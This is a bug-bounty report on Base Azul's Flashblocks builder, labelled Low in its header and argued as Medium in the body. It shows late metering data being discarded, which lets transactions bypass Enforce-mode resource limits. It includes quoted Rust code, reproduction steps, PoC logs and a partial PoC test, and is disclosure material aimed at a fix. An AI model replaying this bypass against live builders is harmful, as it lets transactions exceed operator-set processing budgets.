# 76311 bc low valid late metering is discarded after a non meteringdatapending non inclusion allowing enforce mode per transaction and per flashblock resource budgets to be bypassed

**Submitted on May 3rd 2026 at 19:52:12 UTC by @legat for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76311
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Title

`MeteringStore::insert()` discards valid late `MeterBundleResponse` data after a first builder miss even when the transaction was not included, allowing ordinary pending transactions to retry with `execution_time_us=None` and `state_root_gas=None` under `ExecutionMeteringMode::Enforce`.

## Summary

Base Azul's Flashblocks builder can enforce predicted execution-time and state-root-gas limits through resource metering. In the intended flow, a transaction's `MeterBundleResponse` is delivered to the metering provider, the builder converts the response into concrete `TxResources`, and `ExecutionInfo::is_tx_over_limits()` rejects transactions whose predicted resource usage exceeds the configured per-transaction or per-flashblock limits.

The current `MeteringStore` breaks that flow in a normal retry state:

1. `MeteringStore::get(tx_hash)` misses before metering has arrived and records the transaction in `needed_at`.
2. The builder does not include the transaction for an ordinary non-metering reason, such as gas-fit at the current block/flashblock boundary.
3. The valid `MeterBundleResponse` then arrives through the normal `MeteringProvider::insert` boundary.
4. `MeteringStore::insert()` sees the prior `needed_at` entry and returns without caching the response.
5. The still-pending transaction retries with no cached response.
6. The builder constructs `TxResources` with `execution_time_us=None` and `state_root_gas=None`.
7. The Enforce-mode execution-time and state-root-gas branches are skipped because they only run when those optional fields are present.

The attached PoC proves this with the scoped `base/base @ v0.8.0-rc.28` repository using the real in-process Flashblocks builder, real txpool ingress, real Engine API block production, the real `MeteringStore`, and the real `ExecutionInfo::is_tx_over_limits()` path.

The final passing run contains three exploit/control scenarios:

* **Single-transaction primitive:** a transaction is considered before metering is cached, non-included for gas-fit, receives valid late metering, has that response discarded, and is later included unmetered under Enforce mode.
* **Cumulative per-flashblock bypass:** five independent race-affected transactions each have valid metering claiming `75,000us`, above the configured `50,000us` per-transaction limit. All five responses are discarded, all five retry unmetered, and all five are included in one retry flashblock. The bypassed metered claim is `375,000us` against a `200,000us` per-flashblock budget: **187%** of the configured budget.
* **Control:** the same transaction class with metering inserted before selection is rejected by Enforce mode, proving the limit configuration works when the valid response is not discarded.

## Finding Description

### Intended behavior

When resource metering is enabled and the builder runs in `ExecutionMeteringMode::Enforce`, a valid metering response for a transaction that remains pending must be cached and enforced on the next builder attempt.

The safe invariant is:

```
transaction is still pending / was not included
+ valid MeterBundleResponse arrives
=> cache the response
=> next builder attempt evaluates execution-time and state-root-gas limits
```

Late-arrival accounting is only safe once the transaction no longer needs the response. A prior `get()` miss alone does not prove that the transaction was included or that the response is no longer useful. A considered-but-not-included transaction can remain in the pool and be selected again.

### Actual behavior

`MeteringStore::get()` records a miss for every cache miss, before the builder knows whether the transaction will be included:

```rust
let Some(entry) = self.cache.get(tx_hash) else {
    self.needed_at.entry_by_ref(tx_hash).or_insert(Instant::now());
    return None;
};
```

`MeteringStore::insert()` then treats the presence of that miss marker as terminal late-arrival state and returns without caching the valid response:

```rust
if let Some(needed_at) = self.needed_at.remove(&tx_hash) {
    let latency_ms = needed_at.elapsed().as_millis() as f64;
    BuilderMetrics::metering_late_arrival_total().increment(1);
    BuilderMetrics::metering_late_arrival_latency_ms().record(latency_ms);
    BuilderMetrics::metering_late_arrival_execution_time_us()
        .record(metering.total_execution_time_us as f64);
    BuilderMetrics::metering_late_arrival_state_root_time_us()
        .record(metering.state_root_time_us as f64);
    return;
}

self.cache.insert(tx_hash, metering);
```

That conflates two states:

```
State A: builder needed metering and included the transaction without it.
State B: builder needed metering, but the transaction was not included and remains pending.
```

Only State A can safely consume the response without caching it. State B must cache the response because the transaction can be selected in a later block or flashblock.

The builder reaches State B naturally. The builder asks the metering provider for the transaction response:

```rust
let resource_usage = self.builder_config.metering_provider.get(&tx_hash);
```

If no response is present, the builder later converts the missing response into missing optional resource fields:

```rust
let predicted_execution_time_us =
    resource_usage.as_ref().map(|m| m.total_execution_time_us);

let state_root_gas = resource_usage.as_ref().map(|m| {
    ...
});

let tx_resources = TxResources {
    da_size: tx_da_size,
    gas_limit: tx.gas_limit(),
    execution_time_us: predicted_execution_time_us,
    state_root_gas,
    uncompressed_size: tx_uncompressed_size,
};
```

For a missing response, `execution_time_us` and `state_root_gas` are `None`.

`ExecutionInfo::is_tx_over_limits()` evaluates those limits only when the fields are present:

```rust
if let Some(tx_time) = tx.execution_time_us {
    if let Some(tx_limit) = limits.tx_execution_time_limit_us
        && tx_time > tx_limit
    {
        return Err(TransactionExecutionTime(tx_time, tx_limit).into());
    }

    if let Some(flashblock_limit) = limits.flashblock_execution_time_limit_us {
        let total_time = self.flashblock_execution_time_us.saturating_add(tx_time);
        if total_time > flashblock_limit {
            return Err(FlashblockExecutionTime(
                self.flashblock_execution_time_us,
                tx_time,
                flashblock_limit,
            )
            .into());
        }
    }
}

if let Some(tx_sr_gas) = tx.state_root_gas
    && let Some(block_limit) = limits.block_state_root_gas_limit
{
    let total = self.cumulative_state_root_gas.saturating_add(tx_sr_gas);
    if total > block_limit {
        return Err(BlockStateRootGas(
            self.cumulative_state_root_gas,
            tx_sr_gas,
            block_limit,
        )
        .into());
    }
}
```

The resulting vulnerable sequence is:

```
builder first considers tx before metering is cached
=> MeteringStore::get(tx_hash) records needed_at and returns None
=> tx is not included for gas-fit / other non-metering reason
=> valid MeterBundleResponse arrives
=> MeteringStore::insert(tx_hash, response) discards it because needed_at exists
=> same pending tx is selected again
=> MeteringStore::get(tx_hash) still returns None
=> TxResources has execution_time_us=None and state_root_gas=None
=> Enforce branches are skipped
=> tx is included even though valid metering would reject it
```

The passing PoC logs demonstrate this exact sequence for both one transaction and five transactions in a single retry flashblock.

## Root Cause

The root cause is that `MeteringStore` uses one marker, `needed_at`, for two different meanings:

```
meaning 1: the builder needed metering data and did not have it
meaning 2: the transaction has already consumed its opportunity without metering, so late data is no longer useful
```

Those states are not equivalent. A cache miss happens before final inclusion/non-inclusion is known. A transaction can be considered, miss metering, fail to fit into the current block/flashblock, and remain pending. The late response for that still-pending transaction is security-relevant and must be cached.

The vulnerable composition is:

1. `get()` records `needed_at` on any miss.
2. Only the explicit `MeteringDataPending` wait-window skip clears the marker.
3. Other non-inclusion paths, including gas-fit non-inclusion, can leave `needed_at` set.
4. `insert()` treats `needed_at` as a discard signal and returns without caching.
5. Enforce mode fails open for missing optional resource fields.

This is a state-machine bug in production builder/metering code, not a telemetry-only issue.

## Impact Explanation

**Medium — operator-configured `ExecutionMeteringMode::Enforce` resource budgets can be bypassed for still-pending transactions after valid late metering is discarded.**

The PoC proves two levels of impact.

First, it proves a single transaction whose valid response claims `75,000us` of execution time is included after the response is discarded, despite the configured per-transaction limit being `50,000us`:

```
per-transaction limit:              50,000us
valid metering claim for the tx:     75,000us
metered path result:                rejected
late-discard retry path result:      included with execution_time_us=None
```

Second, it proves that the bypass scales across multiple ordinary public transactions in one retry flashblock:

```
race-affected transactions:          5
per-tx predicted execution:          75,000us
cumulative predicted execution:      375,000us
per-flashblock budget:               200,000us
bypassed budget claim:               187% of configured budget
retry flashblock gas target:         12,000,000
five txs' declared gas total:        10,000,000
```

All five race transactions fit into one retry flashblock gas target, all five responses are discarded, and all five retry unmetered. This bypasses both the per-transaction limit and the per-flashblock budget that Enforce mode was configured to enforce.

## Likelihood Explanation

Likelihood is realistic for metering-enabled deployments because the necessary states are normal asynchronous builder states:

* metering data is produced outside the builder's immediate transaction-selection loop;
* a transaction can be selected before its response is cached;
* transactions can fail inclusion for non-metering reasons, including gas-fit at a block/flashblock boundary;
* the transaction can remain pending and be retried;
* the late response can arrive between the first miss and the retry; and
* the same `MeteringProvider::insert` path is used by the production metering ingress boundary.

The PoC directly calls `MeteringProvider::insert` only to deterministically deliver the metering response at the production provider boundary; the attacker-side trigger is ordinary signed transaction submission plus a normal asynchronous late-delivery race.

## Severity

**Medium.**

The PoC uses real builder components and proves that valid metering data is discarded while the transaction is still pending, after which Enforce-mode limits are skipped.

The Medium framing is based on:

* a real, in-scope production state-machine bug;
* ordinary public transaction ingress;
* no privileged or governance role assumptions;
* per-transaction Enforce limit bypass;
* cumulative per-flashblock budget bypass with five independent race-affected transactions; and
* explicit control evidence that the same metering data rejects when cached normally.

## Attack Path / Reproduction Path

{% stepper %}
{% step %}
A Base Azul Flashblocks builder deployment enables resource metering with `ExecutionMeteringMode::Enforce`.
{% endstep %}

{% step %}
Per-transaction execution-time and per-flashblock execution-time budgets are configured.
{% endstep %}

{% step %}
A public user submits one or more transactions through ordinary transaction ingress.
{% endstep %}

{% step %}
The transactions enter the real txpool.
{% endstep %}

{% step %}
The builder considers the transactions before their `MeterBundleResponse` objects are cached.
{% endstep %}

{% step %}
`MeteringStore::get(tx_hash)` misses and records `needed_at[tx_hash]` for each transaction.
{% endstep %}

{% step %}
The transactions are not included in that first attempt for an ordinary non-metering reason. The PoC uses gas-fit non-inclusion.
{% endstep %}

{% step %}
Valid metering responses arrive for the same transaction hashes.
{% endstep %}

{% step %}
The metering provider calls `MeteringStore::insert(tx_hash, response)`.
{% endstep %}

{% step %}
`insert()` sees `needed_at[tx_hash]` and returns without caching the response.
{% endstep %}

{% step %}
The transactions remain pending.
{% endstep %}

{% step %}
A later builder attempt selects the same transactions.
{% endstep %}

{% step %}
`MeteringStore::get(tx_hash)` still returns `None`.
{% endstep %}

{% step %}
The builder constructs `TxResources` with missing `execution_time_us` and `state_root_gas` fields.
{% endstep %}

{% step %}
`ExecutionInfo::is_tx_over_limits()` skips execution-time and state-root-gas checks because the fields are absent.
{% endstep %}

{% step %}
The transactions are included under Enforce mode.
{% endstep %}

{% step %}
A control transaction with metering cached before first selection is rejected, proving the bypass comes from the late-discard state transition.
{% endstep %}
{% endstepper %}

## External Preconditions

* The builder deployment enables resource metering.
* The builder runs with `ExecutionMeteringMode::Enforce`.
* Execution-time and/or state-root-gas limits are configured.
* A public transaction enters the txpool before its metering response is cached.
* The transaction is considered and remains pending after a non-metering non-inclusion.
* The valid response arrives after the first miss and before a later retry.

## Internal Preconditions

* `MeteringStore::get(tx_hash)` misses and records `needed_at`.
* The transaction is not committed in the first attempt.
* The non-inclusion path does not clear `needed_at`.
* `MeteringStore::insert(tx_hash, response)` observes `needed_at` and returns without caching the response.
* The later retry reads `resource_usage=None`.
* `TxResources.execution_time_us` and `TxResources.state_root_gas` are `None`.
* `ExecutionInfo::is_tx_over_limits()` only evaluates the relevant limits when those fields are present.

## Recommendation

Track “metering was needed” separately from “the transaction was included or otherwise consumed without metering.” A prior `get()` miss is not sufficient proof that a later valid response should be discarded.

### Primary fix

Change `MeteringStore::insert()` so a valid response for a still-pending transaction is cached even when `needed_at` exists.

One safe design:

```
get() miss records needed_at
if tx is included without metering: mark tx_hash as consumed_without_metering
if tx is skipped only for MeteringDataPending: clear needed_at
if tx is not included for any other reason and remains pending: preserve/cache later metering
insert(tx_hash, response):
    if consumed_without_metering contains tx_hash:
        record late-arrival metrics and do not cache
    else:
        record late-arrival metrics if needed_at exists
        cache response for future builder attempts
```

The fixed behavior should be:

```
first miss + tx not included + valid response arrives
=> response is cached
=> retry uses Some(MeterBundleResponse)
=> Enforce-mode limits reject or account for the transaction correctly
```

### Additional hardening

1. Clear or reclassify `needed_at` when a transaction is considered but not committed for gas fit, DA fit, block-size fit, target-block mismatch, or other non-metering reasons.
2. Add a separate metric for “late response cached for still-pending tx” instead of treating every late response as consumed.
3. Add a regression test where a transaction first misses metering, is not included, receives a valid late response, and is retried. The retry must see `Some(MeterBundleResponse)`.
4. Add a regression test proving that a transaction actually included without metering can still be counted as a true late-arrival event without reusing stale data after commit.
5. Fail closed under Enforce mode when required metering fields are missing after the configured wait policy has elapsed.

## Affected Code (must be fixed in scope files)

### Mandatory fix 1: `MeteringStore::get()` records a miss before inclusion/non-inclusion is known

* **File:** `crates/builder/metering/src/store.rs`
* **Lines:** `L18-L25`, `L68-L79`
* **Links:**
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/metering/src/store.rs#L18-L25>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/metering/src/store.rs#L68-L79>

`get()` records `needed_at` as soon as the builder needs data and does not have it. At that moment, the store does not know whether the transaction will be included, skipped, rejected for another resource, or remain pending.

### Mandatory fix 2: `MeteringStore::insert()` discards valid responses whenever `needed_at` exists

* **File:** `crates/builder/metering/src/store.rs`
* **Lines:** `L88-L101`
* **Link:** <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/metering/src/store.rs#L88-L101>

This is the primary patch location. `insert()` must not treat a prior miss as sufficient proof that the response should be consumed without caching.

### Mandatory fix 3: only the explicit `MeteringDataPending` skip clears `needed_at`

* **File:** `crates/builder/core/src/flashblocks/context.rs`
* **Lines:** `L692-L710`
* **Link:** <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs#L692-L710>

The builder calls `metering_provider.skip(&tx_hash)` only in the explicit wait-window `MeteringDataPending` path. Other non-inclusion paths can leave the miss marker in place while the transaction remains pending.

### Mandatory fix 4: missing metering is converted into optional `TxResources` fields

* **File:** `crates/builder/core/src/flashblocks/context.rs`
* **Lines:** `L713-L739`
* **Link:** <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs#L713-L739>

When `resource_usage` is absent, `predicted_execution_time_us` and `state_root_gas` are absent. The later enforcement path therefore has no values to check.

### Mandatory fix 5: execution-time and state-root-gas limits are checked only when optional fields are present

* **File:** `crates/builder/core/src/execution.rs`
* **Lines:** `L60-L65`, `L334-L370`
* **Links:**
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/execution.rs#L60-L65>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/execution.rs#L334-L370>

The checker skips execution-time and state-root-gas enforcement when those fields are `None`. This makes the store discard security-relevant, not merely telemetry-relevant.

### Mandatory fix 6: metering RPC ingress uses the same `insert()` boundary

* **File:** `crates/builder/metering/src/ext.rs`
* **Lines:** `L12-L22`, `L47-L54`
* **Links:**
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/metering/src/ext.rs#L12-L22>
  * <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/metering/src/ext.rs#L47-L54>

The production metering extension forwards metering responses to `self.store.insert(tx_hash, metering)`. The vulnerable store transition is therefore on the normal metering-ingress boundary.

### Mandatory fix 7: cleanup only removes committed or permanently rejected transactions

* **File:** `crates/builder/core/src/flashblocks/payload.rs`
* **Lines:** `L596-L617`
* **Link:** <https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/payload.rs#L596-L617>

A transaction that was considered but not committed can remain available for a later builder attempt. If its valid metering response was discarded, that later attempt can proceed with missing resource fields.

## Proof of Concept

This PoC contains the complete scenario needed to prove the Medium bug with the current fixed test file.

It proves:

* the target transactions enter the real txpool;
* the builder considers them before metering has arrived;
* the first build does not include them because of gas-fit, a non-`MeteringDataPending` non-inclusion reason;
* the real store records `needed_at`;
* valid expensive responses are delivered through `MeteringProvider::insert`;
* the store discards the responses and retains zero cached entries;
* the retry block includes the transactions under Enforce mode;
* five transactions fit one retry flashblock gas target and bypass a cumulative `375,000us` metered claim against a `200,000us` budget; and
* a control transaction with response data inserted before selection is rejected.

### Files / placement

Place the PoC here:

```
crates/builder/core/tests/poc_metering_late_discard_medium.rs
```

### Run command

Run from the `base/base @ v0.8.0-rc.28` repository root:

```bash
cargo test -p base-builder-core --features test-utils --test poc_metering_late_discard_medium -- --nocapture --test-threads=1 2>&1 | tee poc_metering_late_discard_medium.log
```

### Scenario 1: single transaction state-machine bug

1. Configure the real local builder with resource metering enabled, `ExecutionMeteringMode::Enforce`, and realistic execution limits.
2. Submit one transaction through the normal transaction builder helper into the real txpool.
3. Build a first constrained block/flashblock.
4. The transaction is considered, `MeteringStore::get()` records `needed_at`, and the transaction is not included for gas-fit.
5. Insert a valid `MeterBundleResponse` claiming `75,000us`, which exceeds the `50,000us` per-transaction limit.
6. Prove the store still has no cached entry for the hash after insert.
7. Build a retry block with sufficient gas capacity.
8. Prove the transaction is included unmetered.

### Scenario 2: cumulative per-flashblock budget bypass

1. Fund five distinct senders.
2. Submit five independent transactions through the real txpool.
3. Build a first constrained block/flashblock that considers all five and rejects all five for gas-fit.
4. Insert valid `MeterBundleResponse` values for all five hashes.
5. Prove all five responses are discarded.
6. Build a retry block whose first flashblock gas target is `12,000,000`.
7. Prove the five declared-gas transactions total `10,000,000`, so all five fit one retry flashblock target.
8. Prove all five are included.
9. Prove the bypassed metered claim is `375,000us`, or `187%` of the configured `200,000us` per-flashblock budget.

### Scenario 3: control path

1. Submit a control transaction through the real txpool.
2. Insert the same kind of metering response before first builder selection.
3. Build a block with enough gas capacity.
4. Prove the transaction is rejected for `execution_time` and is not included.

### Passing proof logs from final run

```
running 12 tests

test metering_late_discard_cumulative_flashblock_overrun ... [POC][test2] cumulative per-flashblock budget bypass via N race-affected txs
[POC][test2][config] RACE_TX_COUNT=5 RACE_TX_PREDICTED_EXECUTION_US=75000 PER_TX_EXECUTION_LIMIT_US=50000 PER_FLASHBLOCK_BUDGET_US=200000
[POC][cumulative-arith] n=5 per_tx_us=75000 cumulative=375000us budget=200000us overrun=187% retry_batch_gas_limit=12000000 total_declared_gas=10000000
[POC][test2][submit] race tx idx=0 sender=0xe4b14D46B127962f96477725515425Ba3904bF9F tx_hash=0x4a17efe73ee300019f1009479e5fafac354027510b74e7fe32928639142a0a76
[POC][test2][submit] race tx idx=1 sender=0x5e143615FB61a63b637B52B5889bAA1688aA2F66 tx_hash=0x0275c7b4d3ddf3f5d43281ca7d2b402c360bffa6f7a004bacd6e1c7d6781ad97
[POC][test2][submit] race tx idx=2 sender=0xa5d3d6Ab1D9466ee407fEED9060D91968cC20627 tx_hash=0x21688ce1f0e019c734a895d57e12d341a45a585dc2e1f26f1278114be7807a3e
[POC][test2][submit] race tx idx=3 sender=0x4Bb9b8e93eB4eAc2B29d14c2c274915134689792 tx_hash=0xb86b69294f71866f65602bd639e4c71e2fb9c0fe072b7c0cb4194407dfbe9150
[POC][test2][submit] race tx idx=4 sender=0x9c5C88F7f1E26e8E6DA1564d7964B2f739D8c065 tx_hash=0xd2639b2748722accfd64f898425b133bba52ad197dbe01d98573334909cfcf9d
Flashblock built flashblock_index=1 selection_outcome="pool_drained" rejection_reasons=["gas_limit"] txs_considered=5 txs_included=0 txs_rejected=5 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
Flashblock built flashblock_index=2 selection_outcome="pool_drained" rejection_reasons=["gas_limit"] txs_considered=5 txs_included=0 txs_rejected=5 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
Flashblock built flashblock_index=3 selection_outcome="pool_drained" rejection_reasons=["gas_limit"] txs_considered=5 txs_included=0 txs_rejected=5 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
Flashblock built flashblock_index=4 selection_outcome="pool_drained" rejection_reasons=["gas_limit"] txs_considered=5 txs_included=0 txs_rejected=5 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
Flashblock built flashblock_index=5 selection_outcome="pool_drained" rejection_reasons=["gas_limit"] txs_considered=5 txs_included=0 txs_rejected=5 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
[POC][test2][round1] block_hash=0xbf4547a43a6b89780db42469c814ecac1e5cdcf87e2b6eb0b82e32cf07892288 included=0/5 (gas-fit non-inclusion path)
[POC][control][per-tx] metered tx rejected: transaction execution time exceeded: tx_time_us=75000 limit_us=50000; predicted_us=75000 per_tx_limit_us=50000
[POC][primitive] same realistic limits PASS when execution_time_us=None and state_root_gas=None
[POC][test2][late-insert] tx_hash=0x4a17efe73ee300019f1009479e5fafac354027510b74e7fe32928639142a0a76 predicted_us=75000 via MeteringProvider::insert
[POC][test2][late-insert] tx_hash=0x0275c7b4d3ddf3f5d43281ca7d2b402c360bffa6f7a004bacd6e1c7d6781ad97 predicted_us=75000 via MeteringProvider::insert
[POC][test2][late-insert] tx_hash=0x21688ce1f0e019c734a895d57e12d341a45a585dc2e1f26f1278114be7807a3e predicted_us=75000 via MeteringProvider::insert
[POC][test2][late-insert] tx_hash=0xb86b69294f71866f65602bd639e4c71e2fb9c0fe072b7c0cb4194407dfbe9150 predicted_us=75000 via MeteringProvider::insert
[POC][test2][late-insert] tx_hash=0xd2639b2748722accfd64f898425b133bba52ad197dbe01d98573334909cfcf9d predicted_us=75000 via MeteringProvider::insert
[POC][test2][bug] discarded_count=5/5 store=MeteringStore { entries: 0, needed_at: 5, metering_enabled: true }
Flashblock built flashblock_index=1 selection_outcome="pool_drained" rejection_reasons=[] txs_considered=5 txs_included=5 txs_rejected=0 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
[POC][test2][round2] block_hash=0x62f950661db8aa44f0c315c1a629c30feb9a71ff138c02fa2db68fc9bfa033f7 included=5/5
[POC][test2][round2][included] tx_hash=0x4a17efe73ee300019f1009479e5fafac354027510b74e7fe32928639142a0a76
[POC][test2][round2][included] tx_hash=0x0275c7b4d3ddf3f5d43281ca7d2b402c360bffa6f7a004bacd6e1c7d6781ad97
[POC][test2][round2][included] tx_hash=0x21688ce1f0e019c734a895d57e12d341a45a585dc2e1f26f1278114be7807a3e
[POC][test2][round2][included] tx_hash=0xb86b69294f71866f65602bd639e4c71e2fb9c0fe072b7c0cb4194407dfbe9150
[POC][test2][round2][included] tx_hash=0xd2639b2748722accfd64f898425b133bba52ad197dbe01d98573334909cfcf9d
[POC][test2][single-flashblock-fit] retry_batch_gas_limit=12000000 total_declared_gas=10000000 => all 5 race txs fit one retry flashblock gas target
[POC][test2][result] BUG: per-tx Enforce limit bypassed for 5 txs (each predicted 75000us = 150% of per-tx limit 50000us)
[POC][test2][result] BUG: cumulative per-flashblock budget bypassed: bypassed_metered_claim=375000us = 187% of flashblock_execution_time_budget_us=200000us
[POC][test2][result] CONFIRMED Medium: operator-configured Enforce-mode defense-in-depth bypassed at both the per-tx and per-flashblock level by ordinary public transactions hitting a non-MeteringDataPending non-inclusion race
ok

test metering_late_discard_single_tx_primitive ... [POC][test1] single-tx state-machine bug primitive
[POC][test1][config] PER_TX_EXECUTION_LIMIT_US=50000 PER_FLASHBLOCK_BUDGET_US=200000 RACE_TX_PREDICTED_EXECUTION_US=75000
[POC][test1][submit] target tx submitted via real txpool: tx_hash=0x240f012314635d96a5c2aa74a01f549e96c460de39c41e2095f23c734171c899
Flashblock built flashblock_index=1 selection_outcome="pool_drained" rejection_reasons=["gas_limit"] txs_considered=1 txs_included=0 txs_rejected=1 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
[POC][test1][round1] block_hash=0x4479234ac9b488d26f7deabcded0e23fb9f061c6f16fd715e4f8c0da5b2d9704 target_included=false store=MeteringStore { entries: 0, needed_at: 1, metering_enabled: true }
[POC][control][per-tx] metered tx rejected: transaction execution time exceeded: tx_time_us=75000 limit_us=50000; predicted_us=75000 per_tx_limit_us=50000
[POC][primitive] same realistic limits PASS when execution_time_us=None and state_root_gas=None
[POC][test1][late-insert] inserting valid late MeterBundleResponse via MeteringProvider::insert: tx_hash=0x240f012314635d96a5c2aa74a01f549e96c460de39c41e2095f23c734171c899 predicted_us=75000
[POC][test1][bug] store.len()==0 after late insert (response discarded) store=MeteringStore { entries: 0, needed_at: 1, metering_enabled: true }
Flashblock built flashblock_index=1 selection_outcome="pool_drained" rejection_reasons=[] txs_considered=1 txs_included=1 txs_rejected=0 flashblock_exec_time_us=0 exec_time_limit_us=Some(200000)
[POC][test1][round2] block_hash=0x12293cd55ecab32b55e371b0cb7277e3a5039b8c38979237a9b377d828f97c19 target_included=true
[POC][test1][result] CONFIRMED: late metering discarded; tx included unmetered under Enforce; per-tx limit (50000us) bypassed for predicted (75000us) execution
ok

test metering_present_before_selection_rejects_under_enforce ... [POC][test3] control: metering present at first selection rejects under Enforce
[POC][test3][submit] control tx submitted: tx_hash=0x240f012314635d96a5c2aa74a01f549e96c460de39c41e2095f23c734171c899
[POC][test3][cached] metering present in store before first selection
Metering throttle: transaction rejected tx_hash=0x240f012314635d96a5c2aa74a01f549e96c460de39c41e2095f23c734171c899 limit=transaction execution time exceeded: tx_time_us=75000 limit_us=50000
Flashblock built flashblock_index=1 selection_outcome="pool_drained" rejection_reasons=["execution_time"] txs_considered=1 txs_included=0 txs_rejected=1 exec_time_limit_us=Some(200000)
evicted permanently rejected transactions from pool count=1
[POC][test3][block] block_hash=0x5fd9147a586b07a2295ae274841344f5c840ce85817411a2620679954ec55816 target_included=false
[POC][test3][result] CONFIRMED: when metering is present at first selection, Enforce correctly rejects; the bug is specific to the late-discard state-machine, not the limit configuration
ok

test result: ok. 12 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 45.83s
```

### PoC source (full)

```rust
#![allow(missing_docs)]

use std::{sync::Arc, time::Duration};

use alloy_primitives::{Address, B256, TxHash, U256};
use base_builder_core::{
    BuilderConfig, ExecutionInfo, ExecutionMeteringLimitExceeded, ExecutionMeteringMode,
    MeteringProvider, ResourceLimits, TxResources, TxnExecutionError,
    test_utils::{
        BlockTransactionsExt, ChainDriverExt, ONE_ETH, TransactionBuilderExt,
        generate_signer_from_seed, setup_test_instance_with_builder_config,
    },
};
use base_bundles::{MeterBundleResponse, TransactionResult};

#[path = "../../metering/src/store.rs"]
mod real_metering_store;

use real_metering_store::MeteringStore;

// ---- Operator policy values (production-shaped, matching Flashblocks 200ms SLA) ----

/// Per-transaction execution-time limit configured by the operator (50 ms).
const PER_TX_EXECUTION_LIMIT_US: u128 = 50_000;

/// Per-flashblock execution-time budget configured by the operator
/// (200 ms — matches Flashblocks SLA target).
const PER_FLASHBLOCK_BUDGET_US: u128 = 200_000;

/// Per-block state-root-gas limit configured by the operator.
const PER_BLOCK_STATE_ROOT_GAS_LIMIT: u64 = 5_000_000;

/// Each race-affected transaction's late metering claims this much execution
/// time. 75 ms > 50 ms per-tx limit, so individual rejection would fire if
/// metering were present at selection time.
const RACE_TX_PREDICTED_EXECUTION_US: u128 = 75_000;

/// State-root gas claimed by each race-affected transaction's late metering.
const RACE_TX_PREDICTED_STATE_ROOT_GAS: u64 = 1_500_000;

/// Number of race-affected transactions in the cumulative-bypass test.
/// 5 × 75 ms = 375 ms cumulative metered claim > 200 ms per-flashblock budget.
const RACE_TX_COUNT: usize = 5;

/// Declared `gas_limit` on each big transaction. Larger than the first build's
/// block gas limit so each transaction hits the gas-fit non-inclusion path
/// during the first build round, but small enough that all five txs fit in
/// one retry flashblock gas target.
const RACE_TX_DECLARED_GAS_LIMIT: u64 = 2_000_000;

/// First build's block gas limit — small enough to force gas-fit non-inclusion.
const FIRST_BUILD_BLOCK_GAS_LIMIT: u64 = 1_000_000;

/// Retry build's block gas limit — generous so all race-affected txs fit
/// in the same retry flashblock gas target when retried unmetered. With the
/// default PoC timing (1s block / 200ms flashblock interval), the builder
/// creates five flashblocks, so the retry per-flashblock gas target is
/// 60_000_000 / 5 = 12_000_000. Five txs × 2_000_000 declared gas =
/// 10_000_000, so Test 2 proves a single-flashblock budget bypass rather
/// than distributing the txs across multiple flashblocks.
const RETRY_BUILD_BLOCK_GAS_LIMIT: u64 = 60_000_000;

// ---- helpers ----

fn realistic_resource_limits() -> ResourceLimits {
    ResourceLimits {
        block_gas_limit: RETRY_BUILD_BLOCK_GAS_LIMIT,
        tx_execution_time_limit_us: Some(PER_TX_EXECUTION_LIMIT_US),
        flashblock_execution_time_limit_us: Some(PER_FLASHBLOCK_BUDGET_US),
        block_state_root_gas_limit: Some(PER_BLOCK_STATE_ROOT_GAS_LIMIT),
        ..Default::default()
    }
}

fn race_metering_response(tx_hash: TxHash) -> MeterBundleResponse {
    MeterBundleResponse {
        bundle_hash: B256::ZERO,
        bundle_gas_price: U256::from(1),
        coinbase_diff: U256::ZERO,
        eth_sent_to_coinbase: U256::ZERO,
        gas_fees: U256::ZERO,
        results: vec![TransactionResult {
            coinbase_diff: U256::ZERO,
            eth_sent_to_coinbase: U256::ZERO,
            from_address: Address::ZERO,
            gas_fees: U256::ZERO,
            gas_price: U256::ZERO,
            gas_used: 700_000,
            to_address: Some(Address::ZERO),
            tx_hash,
            value: U256::ZERO,
            execution_time_us: RACE_TX_PREDICTED_EXECUTION_US,
        }],
        state_block_number: 1,
        state_flashblock_index: Some(0),
        total_gas_used: 700_000,
        total_execution_time_us: RACE_TX_PREDICTED_EXECUTION_US,
        state_root_time_us: 25_000,
        state_root_account_leaf_count: 1,
        state_root_account_branch_count: 1,
        state_root_storage_leaf_count: 32,
        state_root_storage_branch_count: 320,
    }
}

/// Direct call into the real `ExecutionInfo::is_tx_over_limits` arithmetic
/// proving that, at the configured operator policy, a tx whose metering claims
/// `RACE_TX_PREDICTED_EXECUTION_US` is rejected by the per-tx Enforce branch.
fn assert_metered_individually_rejected(metering: &MeterBundleResponse) {
    let info = ExecutionInfo::default();
    let limits = realistic_resource_limits();

    let metered = TxResources {
        gas_limit: RACE_TX_DECLARED_GAS_LIMIT,
        execution_time_us: Some(metering.total_execution_time_us),
        state_root_gas: Some(RACE_TX_PREDICTED_STATE_ROOT_GAS),
        ..Default::default()
    };

    let err = info.is_tx_over_limits(&metered, &limits).expect_err(
        "control: per-tx Enforce limit MUST reject this tx when its valid metering is present",
    );
    assert!(
        matches!(
            err,
            TxnExecutionError::ExecutionMeteringLimitExceeded(
                ExecutionMeteringLimitExceeded::TransactionExecutionTime(_, _)
            )
        ),
        "expected TransactionExecutionTime rejection, got {err:?}"
    );

    println!(
